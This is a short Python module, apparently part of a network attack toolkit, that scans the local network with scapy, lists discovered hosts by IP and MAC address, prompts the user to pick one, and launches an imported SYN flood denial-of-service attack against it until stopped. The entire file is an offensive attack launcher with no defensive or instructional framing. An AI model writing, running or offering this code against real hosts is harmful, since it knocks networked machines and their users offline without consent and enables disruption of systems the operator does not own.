from scapy.all import *

from mod.basic.scan import atk as scan
from mod.system.ddos.syn import syn_flood

def atk():
    out = scan(True)
    print("   IP" + " "*18+"MAC")
    for x in range(len(out)):
        i = out[x]
        print(str(x)+") "+"{:16}    {}".format(i['ip'], i['mac']))
    
    valid = False
    while not valid:
        try:
            num = int(input("enter target ip num: "))
            valid = True
        except Exception:
            print("[!] int not str")
    ip = out[num]['ip']
    mac = out[num]['mac']
    print("[IP] "+ip)
    print("[MAC] "+mac)

    os.system("clear")
    print("[IP] "+ip)
    print("[MAC] "+mac)
    print("attacking press CTRL+C ot stop")
    try:
        syn_flood(ip)
    except KeyboardInterrupt:
        print("[!] user quit")